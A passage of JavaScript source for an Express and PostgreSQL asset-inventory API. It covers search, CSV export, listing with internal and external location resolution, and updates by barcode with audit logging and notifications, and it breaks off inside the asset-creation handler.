/**
 * Assets API (global search + dynamic custom keys)
 * ------------------------------------------------
 * MOUNTED AT: /assets
 *
 * GET /assets
 *   ?q=...        (generic search across fixed fields + location path + attributes)
 *   ?page=1       (1-based)
 *   ?pageSize=25
 *
 * Response:
 * {
 *   columns: string[],           // fixed + all distinct custom keys
 *   rows: Array<Record<string,any>>, // a page of results (fixed + attributes spread)
 *   total: number
 * }
 */

import express from 'express';
import { pool } from '../db.js';
import ImportService from '../services/importService.js';
import { auditSafe } from '../services/audit.js';
import { sendNotificationIfEnabled } from '../services/emailNotificationHelper.js';
import { getLocationSnapshot } from '../services/locationSnapshots.js';
import QueryStream from 'pg-query-stream';
import { Transform } from 'stream';
import { createIdempotencyMiddleware } from "../middleware/idempotency.js";
import { createRequire } from 'module';

const require = createRequire(import.meta.url);

const { ensureLocationPath } = ImportService;
const router = express.Router();
const idempotency = createIdempotencyMiddleware(pool);

router.get('/ok', (_req, res) => res.json({ ok: true, scope: 'assets' }));


/** Fixed columns we always expose */
const FIXED_COLUMNS = [
  'barcode',
  'title',
  'status',
  'is_active',
  'location_path',
  'serial_number',
  'category',
  'tag',
  'company_asset_id',
  'part_name',
  'part_description',
  'type',
  'work_order_number',
  'attributes', // raw JSONB (for completeness)
];

/** Build WHERE clause + params for generic search */
function buildSearchWhere(q, params) {
  if (!q) return { whereSql: '', params };

  const needle = String(q).slice(0, 200);
  params.push(`%${needle}%`);
  const p = `$${params.length}`;

  const whereSql = `
    WHERE
      a.barcode ILIKE ${p} OR
      a.title ILIKE ${p} OR
      a.status ILIKE ${p} OR
      a.is_active ILIKE ${p} OR
      a.serial_number ILIKE ${p} OR
      a.category ILIKE ${p} OR
      a.tag ILIKE ${p} OR
      a.company_asset_id ILIKE ${p} OR
      a.part_name ILIKE ${p} OR
      a.part_description ILIKE ${p} OR
      a.type ILIKE ${p} OR
      a.work_order_number ILIKE ${p} OR
      COALESCE(l.path, '') ILIKE ${p} OR
      EXISTS (
        SELECT 1
        FROM jsonb_each_text(a.attributes) AS kv(k, v)
        WHERE v ILIKE ${p}
      )
  `;
  return { whereSql, params };
}

/** Collect all distinct attribute keys for the current filter */
async function getDistinctAttributeKeys(client, q) {
  let params = [];
  const { whereSql, params: whereParams } = buildSearchWhere(q, params);
  params = whereParams;

  const sql = `
    WITH keys AS (
      SELECT jsonb_object_keys(a.attributes) AS k
      FROM assets a
      LEFT JOIN locations l ON l.id = a.location_id
      ${whereSql}
    )
    SELECT DISTINCT k AS key
    FROM keys
    WHERE k IS NOT NULL
    ORDER BY key ASC
  `;

  const { rows } = await client.query(sql, params);
  return rows.map(r => r.key);
}


// CSV helpers (safe escaping)
function csvEscape(v) {
  if (v === null || v === undefined) return '';
  const s = String(v);
  if (/[",\n\r]/.test(s)) return `"${s.replace(/"/g, '""')}"`;
  return s;
}


function buildWhereAndParams(filters = {}) {
  const params = [];
  const where = [];

  // 🔍 Free-text search
  if (filters.q && filters.q.trim()) {
    params.push(`%${filters.q.trim()}%`);
    const p = `$${params.length}`;
    where.push(`
      (
        a.title ILIKE ${p}
        OR a.barcode ILIKE ${p}
        OR a.serial_number ILIKE ${p}
        OR a.tag ILIKE ${p}
        OR a.company_asset_id ILIKE ${p}
        OR a.part_name ILIKE ${p}
        OR a.part_description ILIKE ${p}
        OR EXISTS (
          SELECT 1 FROM jsonb_each_text(a.attributes)
          WHERE value ILIKE ${p}
        )
      )
    `);
  }

  // Optional filters
  if (filters.status && filters.status.trim()) {
    params.push(filters.status.trim());
    where.push(`a.status = $${params.length}`);
  }
  if (filters.category && filters.category.trim()) {
    params.push(filters.category.trim());
    where.push(`a.category = $${params.length}`);
  }
  if (filters.type && filters.type.trim()) {
    params.push(filters.type.trim());
    where.push(`a.type = $${params.length}`);
  }
  if (filters.locationId && filters.locationId.trim()) {
    params.push(filters.locationId.trim());
    where.push(`a.location_id = $${params.length}`);
  }
  if (filters.isActive !== undefined && filters.isActive !== '') {
    params.push(filters.isActive === 'true');
    where.push(`a.is_active = $${params.length}`);
  }

  const whereSql = where.length > 0 ? `WHERE ${where.join(' AND ')}` : '';
  return { whereSql, params };
}

// Export CSV (streaming)
router.post('/export-csv', async (req, res) => {
  const client = await pool.connect(); // dedicated client for streaming

  try {
    const { filters = {} } = req.body || {};

    const { whereSql, params } = buildWhereAndParams(filters);

    const sql = `
      SELECT
        a.barcode,
        a.title,
        a.is_active,
        a.status,
        a.serial_number,
        a.category,
        a.tag,
        a.company_asset_id,
        a.part_name,
        a.part_description,
        a.type,
        a.work_order_number,
        COALESCE(l.path, el.company_name, '—') AS location_path,
        CASE
          WHEN a.location_id IS NOT NULL THEN 'internal'
          WHEN el.id IS NOT NULL THEN 'external'
          ELSE 'unknown'
        END AS location_type,
        el.company_name     AS external_company_name,
        el.contact_person   AS external_contact_person,
        el.email            AS external_email,
        el.phone            AS external_phone,
        el.address_line1,
        el.address_line2,
        el.notes            AS external_notes
      FROM assets a
      LEFT JOIN locations l ON l.id = a.location_id
      LEFT JOIN issue_item ii ON ii.asset_id = a.id AND ii.status = 'ISSUED'
      LEFT JOIN issue_transaction it ON it.id = ii.transaction_id
      LEFT JOIN external_location el ON el.id = it.external_location_id
      ${whereSql}
      ORDER BY a.created_at DESC NULLS LAST, a.id DESC
    `;

    // CSV headers
    const ts = new Date().toISOString().replace(/[:.]/g, '-');
    res.setHeader('Content-Type', 'text/csv; charset=utf-8');
    res.setHeader('Content-Disposition', `attachment; filename="assets-${ts}.csv"`);
    res.setHeader('Cache-Control', 'no-store');

    const queryStream = new QueryStream(sql, params, { highWaterMark: 1000 });
    const dbStream = client.query(queryStream);

    let headerWritten = false;
    let headers = [];

    const csvTransform = new Transform({
      objectMode: true,
      transform(row, _enc, cb) {
        try {
          if (!headerWritten) {
            headers = Object.keys(row);
            this.push(headers.map(csvEscape).join(',') + '\n');
            headerWritten = true;
          }

          const line = headers.map(h => csvEscape(row[h])).join(',') + '\n';
          this.push(line);
          cb();
        } catch (e) {
          cb(e);
        }
      }
    });

    dbStream.on('error', (err) => {
      console.error('[export-csv db error]', err);
      res.end();
    });

    csvTransform.on('error', (err) => {
      console.error('[export-csv transform error]', err);
      res.end();
    });

    dbStream.pipe(csvTransform).pipe(res);

  } catch (err) {
    console.error('[POST /assets/export-csv]', err);
    if (!res.headersSent) {
      res.status(500).json({ error: 'CSV export failed' });
    }
  } finally {
    client.release();
  }
});



// routes/assets/status-options.js
router.get('/status-options', async (req, res) => {
  try {
    const { rows } = await pool.query(`
      SELECT DISTINCT status
      FROM assets
      WHERE status IS NOT NULL
      ORDER BY status ASC
    `);

    const statuses = rows.map(r => r.status);
    res.json({ statuses });
  } catch (e) {
    console.error('[GET /assets/status-options] failed:', e);
    res.status(500).json({ error: 'Failed to load asset statuses' });
  }
});

router.get('/filters', async (req, res) => {
  try {
    const [statuses, categories, types, locations] = await Promise.all([
      pool.query(`SELECT DISTINCT status FROM assets WHERE status IS NOT NULL ORDER BY status`),
      pool.query(`SELECT DISTINCT category FROM assets WHERE category IS NOT NULL ORDER BY category`),
      pool.query(`SELECT DISTINCT type FROM assets WHERE type IS NOT NULL ORDER BY type`),
      pool.query(`SELECT id, path FROM locations ORDER BY path`)
    ]);

    res.json({
      statuses: statuses.rows.map(r => r.status),
      categories: categories.rows.map(r => r.category),
      types: types.rows.map(r => r.type),
      locations: locations.rows
    });
  } catch (e) {
    console.error('[GET /assets/filters] failed:', e);
    res.status(500).json({ error: 'Failed to load filters' });
  }
});


// POST /assets/search
router.post('/search', async (req, res) => {
  try {
    const { page = 1, pageSize = 25, filters = {} } = req.body;

    const offset = (page - 1) * pageSize;
    const params = [];
    const where = [];

    // 🔍 Free-text search
    if (filters.q && filters.q.trim()) {
      params.push(`%${filters.q.trim()}%`);
      const p = `$${params.length}`;
      where.push(`
        (
          a.title ILIKE ${p}
          OR a.barcode ILIKE ${p}
          OR a.serial_number ILIKE ${p}
          OR a.tag ILIKE ${p}
          OR a.company_asset_id ILIKE ${p}
          OR a.part_name ILIKE ${p}
          OR a.part_description ILIKE ${p}
          OR EXISTS (
            SELECT 1 FROM jsonb_each_text(a.attributes)
            WHERE value ILIKE ${p}
          )
        )
      `);
    }

    // 🧩 Optional filters
    if (filters.status && filters.status.trim()) {
      params.push(filters.status.trim());
      where.push(`a.status = $${params.length}`);
    }
    if (filters.category && filters.category.trim()) {
      params.push(filters.category.trim());
      where.push(`a.category = $${params.length}`);
    }
    if (filters.type && filters.type.trim()) {
      params.push(filters.type.trim());
      where.push(`a.type = $${params.length}`);
    }
    if (filters.locationId && filters.locationId.trim()) {
      params.push(filters.locationId.trim());
      where.push(`a.location_id = $${params.length}`);
    }
    if (filters.isActive !== undefined && filters.isActive !== '') {
      params.push(filters.isActive === 'true');
      where.push(`a.is_active = $${params.length}`);
    }

    // ✅ SAFE: only add WHERE if we actually have conditions
    const whereSql = where.length > 0 ? `WHERE ${where.join(' AND ')}` : '';

    // 🧮 Count query
    const totalSql = `SELECT COUNT(*)::int AS cnt FROM assets a ${whereSql}`;
    //console.log('[DEBUG totalSql]', totalSql, params);
    const totalRes = await pool.query(totalSql, params);
    const total = totalRes.rows?.[0]?.cnt || 0;

    // 📦 Paginated list
    params.push(pageSize);
    params.push(offset);

    // const listSql = `
    //   SELECT
    //     a.barcode,
    //     a.title,
    //     COALESCE(l.path, '') AS location_path,
    //     a.is_active,
    //     a.status,
    //     a.serial_number,
    //     a.category,
    //     a.tag,
    //     a.company_asset_id,
    //     a.part_name,
    //     a.part_description,
    //     a.type,
    //     a.work_order_number,
    //     a.attributes
    //   FROM assets a
    //   LEFT JOIN locations l ON l.id = a.location_id
    //   ${whereSql}
    //   ORDER BY a.created_at DESC
    //   LIMIT $${params.length - 1} OFFSET $${params.length};
    // `;
    const listSql = `
        SELECT
          a.id,
          a.barcode,
          a.title,
          a.is_active,
          a.status,
          a.serial_number,
          a.category,
          a.tag,
          a.company_asset_id,
          a.part_name,
          a.part_description,
          a.type,
          a.work_order_number,
          COALESCE(l.path, el.company_name, '—') AS location_path,
          CASE
            WHEN a.location_id IS NOT NULL THEN 'internal'
            WHEN el.id IS NOT NULL THEN 'external'
            ELSE 'unknown'
          END AS location_type,

          -- ✅ External Location Snapshot (only when asset is ISSUED)
          el.id               AS external_location_id,
          el.company_name     AS external_company_name,
          el.contact_person     AS external_contact_person,
          el.email    AS external_email,
          el.phone    AS external_phone,
          el.address_line1          AS address_line1,
          el.address_line2          AS address_line2,
          el.notes            AS external_notes

        FROM assets a
        LEFT JOIN locations l ON l.id = a.location_id
        LEFT JOIN issue_item ii ON ii.asset_id = a.id AND ii.status = 'ISSUED'
        LEFT JOIN issue_transaction it ON it.id = ii.transaction_id
        LEFT JOIN external_location el ON el.id = it.external_location_id
        ${whereSql}
        ORDER BY a.created_at DESC NULLS LAST, a.id DESC
        LIMIT $${params.length - 1} OFFSET $${params.length};
      `;


    //console.log('[DEBUG listSql]', listSql, params);
    const listRes = await pool.query(listSql, params);

    res.json({
      rows: listRes.rows,
      total,
      page,
      pageSize,
      totalPages: Math.max(1, Math.ceil(total / pageSize)),
    });
  } catch (err) {
    console.error('[POST /assets/search] failed:', err);
    res.status(500).json({ error: 'Failed to search assets' });
  }
});





/** LIST (mounted at /assets) */
/**
 * 
If assets.location_id is NULL, it means the asset is currently issued externally.

So, find its current external location by looking up:

issue_item.asset_id = assets.id

Join to issue_transaction → get external_location_id (and resolve the company name).

If neither location_id (internal) nor external mapping exists, mark the asset as inactive
 */

router.get('/', async (req, res) => {
  const page = Math.max(1, parseInt(req.query.page, 10) || 1);
  const pageSize = Math.min(200, Math.max(1, parseInt(req.query.pageSize, 10) || 25));
  const offset = (page - 1) * pageSize;
  const q = (req.query.q || '').toString().trim();

  const client = await pool.connect();
  try {
    await client.query('BEGIN'); // so we can safely audit any state corrections

    let params = [];
    const { whereSql, params: whereParams } = buildSearchWhere(q, params);
    params = whereParams;

    // 1️⃣ total count
    const countSql = `
      SELECT COUNT(*) AS c
      FROM assets a
      LEFT JOIN locations l ON l.id = a.location_id
      ${whereSql}
    `;
    const { rows: countRows } = await client.query(countSql, params);
    const total = parseInt(countRows[0]?.c || '0', 10);

    // 2️⃣ gather all distinct custom attribute keys
    const customKeys = await getDistinctAttributeKeys(client, q);

    // 3️⃣ main data query — smartly resolve internal / external location
    params = [];
    const where2 = buildSearchWhere(q, params);
    params = where2.params;
    params.push(pageSize);
    params.push(offset);

    const listSql = `
      SELECT
          a.id,
          a.barcode,
          a.title,
          a.is_active,
          a.status,
          a.serial_number,
          a.category,
          a.tag,
          a.company_asset_id,
          a.part_name,
          a.part_description,
          a.type,
          a.work_order_number,
          COALESCE(
            l.path,
            TRIM(
              CONCAT(
                COALESCE(el.company_name, ''),
                CASE WHEN el.contact_person IS NOT NULL THEN ' | ' || el.contact_person ELSE '' END,
                CASE WHEN el.email IS NOT NULL THEN ' | ' || el.email ELSE '' END,
                CASE WHEN el.phone IS NOT NULL THEN ' | ' || el.phone ELSE '' END,
                CASE WHEN el.address_line1 IS NOT NULL THEN ' | ' || el.address_line1 ELSE '' END,
                CASE WHEN el.address_line2 IS NOT NULL THEN ', ' || el.address_line2 ELSE '' END,
                CASE WHEN el.city IS NOT NULL THEN ' | ' || el.city ELSE '' END,
                CASE WHEN el.postal_code IS NOT NULL THEN ' | ' || el.postal_code ELSE '' END,
                CASE WHEN el.notes IS NOT NULL THEN ' | ' || el.notes ELSE '' END
              )
            ),
            '—'
          ) AS location_path,
          CASE
            WHEN a.location_id IS NOT NULL THEN 'internal'
            WHEN el.id IS NOT NULL THEN 'external'
            ELSE 'unknown'
          END AS location_type,
          a.attributes,

          -- ✅ External Location Snapshot (when issued externally)
          el.id               AS external_location_id,
          el.company_name     AS external_company_name,
          el.contact_person     AS external_contact_person,
          el.email            AS external_email,
          el.phone            AS external_phone,
          el.address_line1          AS external_address_line1,
          el.address_line2          AS external_address_line2,
          el.notes            AS external_notes

        FROM assets a
        LEFT JOIN locations l ON l.id = a.location_id
        LEFT JOIN issue_item ii ON ii.asset_id = a.id AND ii.status = 'ISSUED'
        LEFT JOIN issue_transaction it ON it.id = ii.transaction_id
        LEFT JOIN external_location el ON el.id = it.external_location_id
        ${where2.whereSql}
        ORDER BY a.created_at DESC NULLS LAST, a.id DESC
        LIMIT $${params.length - 1} OFFSET $${params.length}
    `;

    const { rows } = await client.query(listSql, params);


    // 4️⃣ Auto-mark inactive if asset has neither internal nor external location
    //    ✅ BUT skip those whose status = 'ISSUED'
    const orphanIds = rows
      .filter(r =>
        !r.location_id &&
        r.location_type === 'unknown' &&
        (!r.status || r.status.toUpperCase() !== 'ISSUED')
      )
      .map(r => r.id);

    if (orphanIds.length > 0) {
      for (const assetId of orphanIds) {
        await client.query(
          `UPDATE assets
       SET is_active = false, updated_at = now()
       WHERE id = $1`,
          [assetId]
        );

        await auditSafe(client, {
          action: 'ASSET_MARK_INACTIVE',
          entity_type: 'asset',
          entity_id: assetId,
          actor_email: req.user?.email || 'system@auto',
          summary: 'Asset marked inactive because no valid internal or external location found (non-issued)',
          after_data: { is_active: false }
        });
      }
    }

    // 5️⃣ Shape final response
    const shaped = rows.map(r => {
      const base = {
        //id: r.id,
        barcode: r.barcode,
        title: r.title,
        is_active: r.is_active,
        status: r.status,
        location_path: r.location_path,
        location_type: r.location_type,
        serial_number: r.serial_number,
        category: r.category,
        tag: r.tag,
        company_asset_id: r.company_asset_id,
        part_name: r.part_name,
        part_description: r.part_description,
        type: r.type,
        work_order_number: r.work_order_number,

        // ✅ Add external location snapshot if present
        external_location: r.external_location_id
          ? {
            //id: r.external_location_id,
            company_name: r.external_company_name,
            contact_person: r.external_person,
            email: r.external_email,
            contact_phone: r.external_phone,
            address1: r.external_address_line1,
            address2: r.external_address_line2,
            notes: r.external_notes,
          }
          : null,
        //attributes: r.attributes || {},
      };

      const attrs = r.attributes || {};
      customKeys.forEach(k => {
        base[k] = attrs[k] ?? null;
      });

      return base;
    });


    const columns = [...FIXED_COLUMNS, ...customKeys];

    await client.query('COMMIT');
    res.json({ columns, rows: shaped, total });
  } catch (err) {
    await client.query('ROLLBACK');
    console.error('[assets] list failed:', err);
    res.status(500).json({ error: 'Failed to load assets' });
  } finally {
    client.release();
  }
});
//Old logic with internal location
// router.get('/', async (req, res) => {
//   const page = Math.max(1, parseInt(req.query.page, 10) || 1);
//   const pageSize = Math.min(200, Math.max(1, parseInt(req.query.pageSize, 10) || 25));
//   const offset = (page - 1) * pageSize;
//   const q = (req.query.q || '').toString().trim();

//   const client = await pool.connect();
//   try {
//     // total count with filter
//     let params = [];
//     const { whereSql, params: whereParams } = buildSearchWhere(q, params);
//     params = whereParams;

//     const countSql = `
//       SELECT COUNT(*) AS c
//       FROM assets a
//       LEFT JOIN locations l ON l.id = a.location_id
//       ${whereSql}
//     `;
//     const { rows: countRows } = await client.query(countSql, params);
//     const total = parseInt(countRows[0]?.c || '0', 10);

//     // gather all distinct custom keys for the current filter
//     const customKeys = await getDistinctAttributeKeys(client, q);

//     // page of rows
//     params = [];
//     const where2 = buildSearchWhere(q, params);
//     params = where2.params;
//     params.push(pageSize);
//     params.push(offset);

//     const listSql = `
//       SELECT
//         a.id,
//         a.barcode,
//         a.title,
//         a.is_active,
//         a.status,
//         a.serial_number,
//         a.category,
//         a.tag,
//         a.company_asset_id,
//         a.part_name,
//         a.part_description,
//         a.type,
//         a.work_order_number,
//         COALESCE(l.path, '') AS location_path,
//         a.attributes
//       FROM assets a
//       LEFT JOIN locations l ON l.id = a.location_id
//       ${where2.whereSql}
//       ORDER BY a.created_at DESC NULLS LAST, a.id DESC
//       LIMIT $${params.length - 1} OFFSET $${params.length}
//     `;

//     const { rows } = await client.query(listSql, params);

//     // spread attributes into row shape
//     const shaped = rows.map(r => {
//       const base = {
//         barcode: r.barcode,
//         title: r.title,
//         is_active: r.is_active,
//         status: r.status,
//         location_path: r.location_path,
//         serial_number: r.serial_number,
//         category: r.category,
//         tag: r.tag,
//         company_asset_id: r.company_asset_id,
//         part_name: r.part_name,
//         part_description: r.part_description,
//         type: r.type,
//         work_order_number: r.work_order_number,
//         attributes: r.attributes || {},
//       };

//       // add custom keys so they render as columns
//       const attrs = r.attributes || {};
//       customKeys.forEach(k => {
//         base[k] = attrs[k] ?? null;
//       });

//       return base;
//     });

//     const columns = [...FIXED_COLUMNS, ...customKeys];

//     res.json({ columns, rows: shaped, total });
//   } catch (err) {
//     console.error('[assets] list failed:', err);
//     res.status(500).json({ error: 'Failed to load assets' });
//   } finally {
//     client.release();
//   }
// });


/**
 * GET /assets/:barcode
 * Returns one asset by barcode (with location_path and attributes)
 */
router.get('/:barcode', async (req, res) => {
  const { barcode } = req.params;

  try {
    const { rows } = await pool.query(
      `
      SELECT
        a.id,
        a.barcode,
        a.title,
        a.status,
        a.serial_number,
        a.category,
        a.tag,
        a.company_asset_id,
        a.part_name,
        a.part_description,
        a.type,
        a.work_order_number,
        a.is_active,
        a.created_at,
        a.updated_at,
        a.attributes,                 -- jsonb
        l.path AS location_path
      FROM assets a
      LEFT JOIN locations l ON l.id = a.location_id
      WHERE a.barcode = $1
      LIMIT 1
      `,
      [barcode]
    );

    if (!rows[0]) {
      return res.status(404).json({ error: 'Asset not found' });
    }

    const r = rows[0];

    // normalize a little for FE parity with list response
    const item = {
      id: r.id,
      barcode: r.barcode,
      title: r.title,
      status: r.status,
      location_path: r.location_path || '',
      serial_number: r.serial_number,
      category: r.category,
      tag: r.tag,
      company_asset_id: r.company_asset_id,
      part_name: r.part_name,
      part_description: r.part_description,
      type: r.type,
      work_order_number: r.work_order_number,
      is_active: r.is_active,
      attributes: r.attributes || {},          // ensure object
      created_at: r.created_at,
      updated_at: r.updated_at,
    };

    // ⬇️ NEW: fetch movement history for this asset
    // const { rows: mrows } = await pool.query(
    //   `
    //   SELECT
    //     m.id,
    //     m.reason,                     -- 'INTERNAL','ISSUE','RETURN','ISSUE_VOID','BULK_IMPORT',...
    //     m.note,
    //     m.created_at,
    //     m.created_by_user,
    //     lf.path AS from_path,
    //     lt.path AS to_path
    //   FROM movements m
    //   LEFT JOIN locations lf ON lf.id = m.from_location_id
    //   LEFT JOIN locations lt ON lt.id = m.to_location_id
    //   WHERE m.asset_id = $1
    //   ORDER BY m.created_at DESC
    //   LIMIT 200
    //   `,
    //   [r.id]
    // );

    // ✅ Fetch ALL movement history for a given asset (accurate version)
    const { rows: mrows } = await pool.query(`
           SELECT
            m.id,
            m.reason,
            m.note,
            m.created_at,
            m.created_by_user,
            a.title AS asset_title,
            a.part_name AS asset_part_name,
            lf.path AS from_path,
            lt.path AS to_path
          FROM movements m
          LEFT JOIN assets a ON a.id = m.asset_id
          LEFT JOIN locations lf ON lf.id = m.from_location_id
          LEFT JOIN locations lt ON lt.id = m.to_location_id
          WHERE m.asset_id = $1
          ORDER BY m.created_at DESC
          LIMIT 200
        `,
      [r.id]); // or [r.id] depending on your variable

    // console.log('==== movments ====');
    // console.log(mrows);

    item.movements = mrows.map(m => ({
      id: m.id,
      reason: m.reason,          // keep original; map to label in FE if you want
      note: m.note || '',
      when: m.created_at,
      from: m.from_path || '',
      to: m.to_path || '',
      by: m.created_by_user || '',
    }));


    return res.json({ item });
  } catch (err) {
    console.error('[GET /assets/:barcode] error:', err);
    return res.status(500).json({ error: 'Server error' });
  }
});

/** Normalize/clean attribute payload keys and values */
function normalizeAttrs(obj) {
  const out = {};
  if (!obj || typeof obj !== 'object') return out;

  for (const [k, v] of Object.entries(obj)) {
    // clean up key: trim, replace spaces with _, strip non-alphanumeric
    const key = String(k || '')
      .trim()
      .replace(/\s+/g, '_')
      .replace(/[^\w.-]/g, '')
      .slice(0, 64);
    if (!key) continue;

    // clean up value
    out[key] = (typeof v === 'string') ? v.trim() : v;
  }

  return out;
}


/* ------------------------------------------------------------- */
/* PUT /assets/:barcode                                          */
/* Partial updates:
 * - location_path (resolves/creates; logs movement on change)
 * - fixed columns
 * - attributes:
 *     * default "merge" (add/update keys)
 *     * "replace" via ?attrs_mode=replace or body.attrs_mode = 'replace'
 *     * delete keys by sending null or '' for that key
 */
/* ------------------------------------------------------------- */
// PUT /assets/:barcode
router.put('/:barcode', idempotency, async (req, res) => {
  const barcode = String(req.params.barcode || '').trim();
  if (!barcode) return res.status(400).json({ error: 'Missing barcode' });

  // who is performing the change (front-end sends this header)
  const userEmail = (req.headers['x-user-email'] || req.headers['X-User-Email'] || '').toString().trim() || null;

  // accepted payload
  const payload = req.body || {};
  const attrsMode = (payload.attrsMode || 'merge').toLowerCase(); // 'merge' | 'replace' | 'patch'
  const removeKeys = Array.isArray(payload.removeKeys) ? payload.removeKeys : [];


  // small helper: clean/normalize attribute object
  const normalizeAttrs = (obj) => {
    const out = {};
    if (!obj || typeof obj !== 'object') return out;
    for (const [k, v] of Object.entries(obj)) {
      const key = String(k || '')
        .trim()
        .replace(/\s+/g, '_')
        .replace(/[^\w.-]/g, '')
        .slice(0, 64);
      if (!key) continue;
      out[key] = (typeof v === 'string') ? v.trim() : v;
    }
    return out;
  };

  const client = await pool.connect();
  try {
    await client.query('BEGIN');

    // fetch current asset (id, location, attributes)
    const prev = await client.query(
      `SELECT a.id, a.location_id, a.attributes, a.is_active
         FROM assets a
        WHERE a.barcode = $1
        LIMIT 1`,
      [barcode]
    );
    if (!prev.rows[0]) {
      await client.query('ROLLBACK');
      return res.status(404).json({ error: 'Asset not found' });
    }

    const assetId = prev.rows[0].id;
    const prevLocId = prev.rows[0].location_id;
    const prevAttrs = prev.rows[0].attributes || {};

    // 1) resolve/ensure location if caller provided location_path (could be null to clear)
    let newLocId = prevLocId;
    if (payload.location_path !== undefined) {
      if (payload.location_path === null || String(payload.location_path).trim() === '') {
        newLocId = null; // clear
      } else {
        const { id } = await ensureLocationPath(client, payload.location_path);
        newLocId = id; // never null here
      }
    }

    // 2) compute next attributes if caller touched attributes or removeKeys
    let nextAttributes = undefined; // undefined => don't touch column
    if (payload.attributes !== undefined || removeKeys.length) {
      const incoming = normalizeAttrs(payload.attributes || {});
      if (attrsMode === 'replace') {
        nextAttributes = { ...incoming };
      } else if (attrsMode === 'patch') {
        // add keys that don't exist; don't overwrite existing keys
        nextAttributes = { ...prevAttrs };
        for (const [k, v] of Object.entries(incoming)) {
          if (!(k in nextAttributes)) nextAttributes[k] = v;
        }
      } else {
        // merge (default): overwrite/insert provided keys
        nextAttributes = { ...prevAttrs, ...incoming };
      }
      // deletions
      for (const k of removeKeys) delete nextAttributes[k];
    }

    // 3) build dynamic UPDATE
    const sets = [];
    const params = [];

    const add = (col, val) => {
      params.push(val);
      sets.push(`${col} = $${params.length}`);
    };

    if (payload.title !== undefined) add('title', payload.title);
    if (payload.status !== undefined) add('status', payload.status);
    if (payload.serial_number !== undefined) add('serial_number', payload.serial_number);
    if (payload.category !== undefined) add('category', payload.category);
    if (payload.tag !== undefined) add('tag', payload.tag);
    if (payload.company_asset_id !== undefined) add('company_asset_id', payload.company_asset_id);
    if (payload.part_name !== undefined) add('part_name', payload.part_name);
    if (payload.part_description !== undefined) add('part_description', payload.part_description);
    if (payload.type !== undefined) add('type', payload.type);
    if (payload.work_order_number !== undefined) add('work_order_number', payload.work_order_number);
    if (payload.is_active !== undefined) add('is_active', payload.is_active);

    // location
    if (payload.location_path !== undefined) add('location_id', newLocId);

    // attributes (jsonb)
    if (nextAttributes !== undefined) add('attributes', nextAttributes);

    // audit columns
    add('updated_at', new Date());
    if (userEmail) add('updated_by_user', userEmail);

    // WHERE barcode
    params.push(barcode);

    if (sets.length) {
      await client.query(
        `UPDATE assets
            SET ${sets.join(', ')}
          WHERE barcode = $${params.length}`,
        params
      );
    }

    // 4) movement log if location changed
    if (payload.location_path !== undefined && prevLocId !== newLocId) {
      await client.query(
        `INSERT INTO movements (asset_id, from_location_id, to_location_id, reason, note, created_at, created_by_user)
         VALUES ($1, $2, $3, $4, $5, now(), $6)`,
        [
          assetId,
          prevLocId,
          newLocId,
          'manual-edit',
          'Location changed via asset edit',
          userEmail || null
        ]
      );
    }

    // 5) return updated snapshot
    const { rows } = await client.query(
      `SELECT a.id,
              a.barcode,
              a.title,
              a.status,
              a.serial_number,
              a.category,
              a.tag,
              a.company_asset_id,
              a.part_name,
              a.part_description,
              a.type,
              a.work_order_number,
              a.location_id,
              COALESCE(l.path, NULL) AS location_path,
              a.attributes,
              a.updated_at,
              a.updated_by_user
         FROM assets a
         LEFT JOIN locations l ON l.id = a.location_id
        WHERE a.barcode = $1
        LIMIT 1`,
      [barcode]
    );

    const before = prev.rows[0];
    const after = payload;
    let eventType = '';

    // Detect if is_active is changed
    if (before?.is_active !== undefined && before?.is_active !== after.is_active) {
      if (after?.is_active === false) {
        eventType = 'DEACTIVATE';
      } else if (after?.is_active === true) {
        eventType = 'ACTIVATED'
      }
    }


    //Audit table
    await auditSafe(client, {
      actor_email: userEmail,
      action: eventType === 'ACTIVATED' ? 'ASSET_UPDATE' : 'ASSET_DEACTIVATE',
      entity_type: 'asset',
      entity_id: rows[0].id,
      summary: `Updated asset "${payload.title}"`,
      before_data: before,
      after_data: after,
    });

    if (eventType === 'ACTIVATED') {
      // 🔔 Send email if enabled
      await sendNotificationIfEnabled(
        "ASSET_EDIT",
        `Asset Updated: ${payload.title}`,
        `<p>Asset updated by user ${userEmail}</p>`
      );
    } else if (eventType === 'DEACTIVATE') {
      // 🔔 Send email if enabled
      await sendNotificationIfEnabled(
        "ASSET_DEACTIVATE",
        `Asset Deactivate: ${payload.title}`,
        `<p>Asset Deactivated by user ${userEmail}</p>`
      );
    }



    await client.query('COMMIT');
    return res.json({ ok: true, item: rows[0] });
  } catch (err) {
    await client.query('ROLLBACK');
    console.error('[PUT /assets/:barcode] failed:', err);
    return res.status(500).json({ error: 'Update failed', detail: err.message });
  } finally {
    client.release();
  }
});


/* -----------------------------------------------
 * POST /assets
 * Body (only provided fields are used):
 * {
 *   barcode: string (required),
 *   title?, status?, serial_number?, category?, tag?,
 *   company_asset_id?, part_name?, part_description?, type?,
 *   work_order_number?, location_path?, attributes?: object
 * }
 * Headers:
 *   X-User-Email: <email> (optional; used as created_by_user)
 * ----------------------------------------------- */
router.post('/', idempotency, async (req, res) => {
  const payload = req.body || {};
  const userEmail = (req.get('x-user-email') || '').trim() || null;

  // console.log('Payload', payload);
  // console.log('userEmail', userEmail);

  // Basic validation
  const barcode = (payload.barcode || '').toString().trim();
  if (!barcode) {
    return res.status(400).json({ error: 'barcode is required' });
  }

  // Clean helper
  const clean = (v) => {
    if (v === undefined || v === null) return null;
    if (typeof v === 'string') {
      const s = v.replace(/[\u00A0\u200B\u200C\u200D\uFEFF]/g, '').trim();
      return s === '' ? null : s;
    }
    return v;
  };

  // Normalize attributes to a plain object (or null)
  const normalizeAttrs = (obj) => {
    if (!obj || typeof obj !== 'object') return null;
    const out = {};
    for (const [k, v] of Object.entries(obj)) {
      const key = String(k || '')
        .trim()
        .replace(/\s+/g, '_')
        .replace(/[^\w.-]/g, '')
        .toLowerCase();
      if (key) {
        const val = typeof v === 'string' ? v.trim() : v;
        if (val !== '' && val !== undefined) out[key] = val;
      }
    }
    return Object.keys(out).length ? out : null;
  };

  const fields = {
    title: clean(payload.title),
    status: clean(payload.status),
    serial_number: clean(payload.serial_number),
    category: clean(payload.category),
    tag: clean(payload.tag),
    company_asset_id: clean(payload.company_asset_id),
    part_name: clean(payload.part_name),
    part_description: clean(payload.part_description),
    type: clean(payload.type),
    work_order_number: clean(payload.work_order_number),
  };

  const client = await pool.connect();
  try {
    await client.query('BEGIN');

    // Fail if barcode already exists
    const exists = await client.query(
      'SELECT id, location_id FROM assets WHERE barcode = $1 LIMIT 1',
      [barcode]
    );
    if (exists.rows[0]) {
      await client.query('ROLLBACK');
